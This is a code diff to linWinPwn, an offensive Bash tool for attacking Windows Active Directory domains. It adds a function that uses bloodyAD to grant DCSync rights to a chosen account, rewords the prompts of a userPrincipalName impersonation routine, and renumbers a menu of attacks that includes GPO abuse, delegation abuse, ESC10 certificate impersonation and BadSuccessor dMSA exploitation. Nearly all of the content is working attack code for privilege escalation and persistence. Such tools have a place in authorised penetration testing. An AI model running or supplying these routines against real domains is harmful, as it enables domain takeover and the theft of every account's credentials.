@@ -165,7 +165,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.6 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.7 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -4348,6 +4348,26 @@ pygpo_abuse() {
     echo -e ""
 }
 
+add_dcsync() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify target user to add DCSync rights to (default: current user):${NC}"
+            target_dcsync=""
+            read -rp ">> " target_dcsync </dev/tty
+            if [ "${target_dcsync}" == "" ]; then target_dcsync="${user}"; fi
+            echo -e "${CYAN}[*] Adding DCSync rights to ${target_dcsync}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dcsync '${target_dcsync}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_dcsync_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 add_unconstrained() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
@@ -4411,17 +4431,17 @@ add_upn() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}"
-            echo -e "${CYAN}[*] Example: user01 ${NC}"
+            echo -e "${BLUE}[*] Adding new userPrincipalName to owned user account. Please specify user:${NC}"
+            echo -e "${CYAN}[*] Example: lowprivuser ${NC}"
             target_upn=""
             read -rp ">> " target_upn </dev/tty
             while [ "${target_upn}" == "" ]; do
-                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                echo -e "${RED}Invalid name.${NC} Please specify user:"
                 read -rp ">> " target_upn </dev/tty
             done
             value_upn=""
             echo -e "${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}"
-            echo -e "${CYAN}[*] Example: user02 ${NC}"
+            echo -e "${CYAN}[*] Example: unixadmin ${NC}"
             read -rp ">> " value_upn </dev/tty
             while [ "${value_upn}" == "" ]; do
                 echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
@@ -7152,13 +7172,14 @@ modif_menu() {
     check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "17"
     check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "18"
     check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "19"
-    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "20"
-    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "21"
-    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "22"
-    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "23"
-    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "24"
-    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "25"
-    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "26"
+    check_tool_status "${bloodyad}" "Add DCSync rights (Requires: GenericWrite)" "20"
+    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "21"
+    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "22"
+    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "23"
+    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "24"
+    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "25"
+    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "26"
+    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "27"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -7266,36 +7287,41 @@ modif_menu() {
         ;;
 
     20)
-        add_spn
+        add_dcsync
         modif_menu
         ;;
 
     21)
-        add_upn
+        add_spn
         modif_menu
         ;;
 
     22)
-        add_upn_esc10
+        add_upn
         modif_menu
         ;;
 
     23)
-        add_constrained
+        add_upn_esc10
         modif_menu
         ;;
 
     24)
-        add_spn_constrained
+        add_constrained
         modif_menu
         ;;
 
     25)
-        badsuccessor_adddmsa
+        add_spn_constrained
         modif_menu
         ;;
 
     26)
+        badsuccessor_adddmsa
+        modif_menu
+        ;;
+
+    27)
         badsuccessor_deletedmsa
         modif_menu
         ;;
